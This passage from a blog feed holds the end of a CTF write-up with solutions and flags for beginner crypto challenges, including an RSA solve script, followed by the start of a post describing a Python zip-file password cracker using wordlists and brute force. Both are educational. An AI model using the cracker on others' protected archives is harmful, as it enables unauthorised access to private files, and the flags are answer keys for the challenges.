I used &lt;a href=&quot;https:&#x2F;&#x2F;www.dcode.fr&#x2F;vigenere-cipher&quot;&gt;this&lt;&#x2F;a&gt; site to do it.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : cvctf{vigenere_is_too_guessy_without_the_key?}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;crypto-warmup-3&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#crypto-warmup-3&quot; aria-label=&quot;Anchor link for: crypto-warmup-3&quot;&gt;Crypto&#x2F;Warmup 3&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;cvctf22&#x2F;cryptowarmup3.png&quot; alt=&quot;crypto&#x2F;warmup3&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;-.-. ...- -.-. - ..-. -- ----- .-. ..... ...-- .. ... -. ----- - ..... ----- ..-. ..- -. is the morse code. I used &lt;a href=&quot;https:&#x2F;&#x2F;gchq.github.io&#x2F;CyberChef&#x2F;&quot;&gt;CyberChef&lt;&#x2F;a&gt; to convert morse code to plaintext.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : cvctf{m0r53isn0t50fun}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;crypto-substitution&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#crypto-substitution&quot; aria-label=&quot;Anchor link for: crypto-substitution&quot;&gt;Crypto&#x2F;Substitution&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;cvctf22&#x2F;cryptosubstitution.png&quot; alt=&quot;crypto&#x2F;Substitution&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I used &lt;a href=&quot;https:&#x2F;&#x2F;www.guballa.de&#x2F;substitution-solver&quot;&gt;This&lt;&#x2F;a&gt; website to solve this.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : cvctf{averysimplesubstitution}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;crypto-rsa-1&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#crypto-rsa-1&quot; aria-label=&quot;Anchor link for: crypto-rsa-1&quot;&gt;Crypto&#x2F;RSA 1&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;cvctf22&#x2F;cryptorsa1.png&quot; alt=&quot;crypto&#x2F;RSA1&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This is a RSA challenge with small e. And i used factordb to find the primes of N, then i computed the phi to find the d which can be used to decrypt the cipher.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;utilis &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;egcd&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;modinv&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;Convert
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;Factorizations&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;factordb &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;*
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;factordb&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;n&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;        f &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;FactorDB&lt;&#x2F;span&gt;&lt;span&gt;(n)
&lt;&#x2F;span&gt;&lt;span&gt;        f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;connect&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;get_factor_list&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    n &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0x7c05a45d02649367ebf6f472663119777ce5f9b3f2283c7b03471e9feb1714a3ce9fa31460eebd9cd5aca7620ecdb52693a736e2fcc83d7909130c6038813fd16ef50c5ca6f491b4a8571289e6ef710536c4615604f8e7aeea606d4b5f59d7adbec935df23dc2bbc2adebbee07c05beb7fa68065805d8c8f0e86b5c3f654e651&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    e &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0x10001&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;0x35b63f7513dbb828800a6bcd708d87a6c9f33af634b8006d7a94b7e3ba62e6b9a1732a58dc35a8df9f7554e1168bfe3de1cb64792332fc8e5c9d5db1e49e86deb650ee0313aae53b227c75e40779a150ddb521f3c80f139e26b2a8880f0869f755965346cd28b7ddb132cf8d8dcc31c6b1befc83e21d8c452bcce8b9207ab76e&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    n &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    e &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(e&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    factordb &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;factordb&lt;&#x2F;span&gt;&lt;span&gt;(n)
&lt;&#x2F;span&gt;&lt;span&gt;    q &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;factordb[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;    p &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;factordb[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;    phi &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(p&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;(q&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    d &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;modinv&lt;&#x2F;span&gt;&lt;span&gt;(e&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;phi)
&lt;&#x2F;span&gt;&lt;span&gt;    decode &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;n)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Convert&lt;&#x2F;span&gt;&lt;span&gt;(decode)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;except &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;IndexError&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;[-] Sorry Can&amp;#39;t Factorize n &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : cvctf{f4c70rDB_15_p0w3rfu1}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>ZipCrack</title>
        <published>2022-10-15T00:00:00+00:00</published>
        <updated>2022-10-15T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/projects/pythonzipfilecrack/"/>
        <id>https://themj0ln1r.github.io/projects/pythonzipfilecrack/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/projects/pythonzipfilecrack/">&lt;p&gt;Hi mates!,&lt;&#x2F;p&gt;
&lt;p&gt;Mj0ln1r is here, this time with another simple project named &quot;PythonZipCracker&quot; developed with python.&lt;&#x2F;p&gt;
&lt;p&gt;As you know i am learning and building some simple python automated tools. PythonZipCracker is my third tool which is programmed by my own knowledge.&lt;&#x2F;p&gt;
&lt;p&gt;I wrote this script called &lt;code&gt;PythonZipCracker&lt;&#x2F;code&gt; in python. I learned &lt;code&gt;pyzipper and zipfile&lt;&#x2F;code&gt; modules in python.&lt;&#x2F;p&gt;
&lt;p&gt;So, here&#x27;s a brief information about my simple PythonZipCracker.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;pythonzipcracker&quot;&gt;PythonZipCracker&lt;&#x2F;h1&gt;
&lt;p&gt;This is a multiway password protected zip file cracker. The script is developed using python which can perform following tasks.&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;It can crack the password of a zip file with the rockyou.txt&lt;&#x2F;li&gt;
&lt;li&gt;It can crack the password of a zip file using your own password list&lt;&#x2F;li&gt;
&lt;li&gt;It can crack the password of a zip file with the bruteforcing of digits&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;Let&#x27;s explore the main()&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;main&lt;&#x2F;span&gt;&lt;span&gt;():
&lt;&#x2F;span&gt;&lt;span&gt;	zfile &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter absolute path of the zip file : &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;not &lt;&#x2F;span&gt;&lt;span&gt;os&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;path&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;isfile&lt;&#x2F;span&gt;&lt;span&gt;(zfile):
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(zfile&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot; is not found..&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;dir &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;zfile[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(zfile)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;os&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;path&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;isdir&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;dir&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;dir&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;is already present.. extracting may leads to overwrite of old files.&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;Select method 
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;	1. Crack using built-in wordlist
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;	2. Crack with custom wordlist
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;	3. Crack using bruteforce method
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;	0. Exit
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;		&amp;quot;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;	choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter your choice[1&#x2F;2&#x2F;3&#x2F;0] : &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1 &lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;rocku&lt;&#x2F;span&gt;&lt;span&gt;(zfile)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;elif &lt;&#x2F;span&gt;&lt;span&gt;choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2 &lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;		wfile &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter the absolute path of your password list: &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;not &lt;&#x2F;span&gt;&lt;span&gt;os&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;path&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;isfile&lt;&#x2F;span&gt;&lt;span&gt;(wfile):
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(wfile&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot; is not found..&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;custom_passwd&lt;&#x2F;span&gt;&lt;span&gt;(zfile&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;wfile)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;elif &lt;&#x2F;span&gt;&lt;span&gt;choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;3 &lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;----------------------------------------------------------------------------
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;Bruteforcing method takes too much of time and system resources to perform..
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;Use this method to crack the passwords of length upto 4 only.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;And the passwords are combination of digits only.
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;----------------------------------------------------------------------------
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;			&amp;quot;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		passlen &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter the length of password[Note: &amp;lt;5] : &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;bruteforce&lt;&#x2F;span&gt;&lt;span&gt;(zfile&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;passlen)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else &lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The main() function is printing the menu of the script and performing the input files are validations.
If the user chooses built-in wordlist method to crack the zip file then the &lt;code&gt;rocku()&lt;&#x2F;code&gt; function will be invoked.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;rocku&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;zfile&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;	wordlist &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;rockyou.txt&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;r&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span&gt;pyzipper&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;AESZipFile&lt;&#x2F;span&gt;&lt;span&gt;(zfile) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;zf:
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;wordlist:
&lt;&#x2F;span&gt;&lt;span&gt;			pwd &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;bytes&lt;&#x2F;span&gt;&lt;span&gt;(i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strip&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;utf-8&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
